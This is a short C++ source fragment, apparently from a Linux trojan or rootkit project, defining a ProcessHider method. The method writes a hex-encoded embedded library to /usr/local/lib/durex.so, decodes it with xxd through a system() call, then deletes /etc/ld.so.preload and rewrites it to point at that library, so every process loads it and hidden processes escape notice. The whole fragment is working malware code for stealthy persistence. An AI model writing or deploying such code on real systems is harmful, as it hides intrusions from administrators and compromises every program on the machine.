void ProcessHider::initLibrary()
{
	std::fstream file;
	std::string filename = "/usr/local/lib/durex.so";

	unlink(filename.c_str());
	file.open(filename.c_str(), std::fstream::in | std::fstream::out | std::fstream::app);
	if (file.is_open()) {
		file << this->getRawLibrary();
		file.close();

		std::string create_lib = "xxd -r -p " + filename + " " + filename;
		system(create_lib.c_str());

		std::fstream file_pre;
		std::string filename_pre = "/etc/ld.so.preload";
		unlink(filename_pre.c_str());
		file_pre.open(filename_pre.c_str(), std::fstream::in | std::fstream::out | std::fstream::app);
		if (file_pre.is_open()) {
			file_pre << filename;
			file_pre.close();
		}
	}
}

